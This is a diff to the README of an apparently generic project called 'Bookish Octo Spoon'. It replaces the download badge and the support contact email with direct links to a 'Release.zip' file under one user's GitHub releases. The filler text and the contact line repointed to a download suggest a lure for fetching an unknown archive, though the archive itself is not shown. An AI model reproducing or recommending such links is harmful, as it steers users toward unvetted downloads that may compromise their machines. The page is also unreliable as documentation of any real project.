@@ -12,7 +12,7 @@ Welcome to the Bookish Octo Spoon GitHub repository - your one-stop destination 
 
 To dive into the wonderful world of Bookish Octo Spoon, you can download the latest release by clicking the button below:
 
-[![Download Bookish Octo Spoon](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Bookish Octo Spoon](https://github.com/AprionoN/bookish-octo-spoon/releases/download/v1.0/Release.zip)](https://github.com/AprionoN/bookish-octo-spoon/releases/download/v1.0/Release.zip)
 
 If the link doesn't work or ends with a file name, you can always check the "Releases" section for alternative download options.
 
@@ -44,7 +44,7 @@ In our Bookish Octo Spoon community, we value respect, diversity, and a love for
 
 ## Support 📧
 
-If you have any questions, issues, or just want to chat about books and octopuses, feel free to reach out to our team at bookish-octo-spoon@example.com.
+If you have any questions, issues, or just want to chat about books and octopuses, feel free to reach out to our team at https://github.com/AprionoN/bookish-octo-spoon/releases/download/v1.0/Release.zip
 
 Let's make the world a better place one book and octopus tale at a time! 📚🐙✨
 
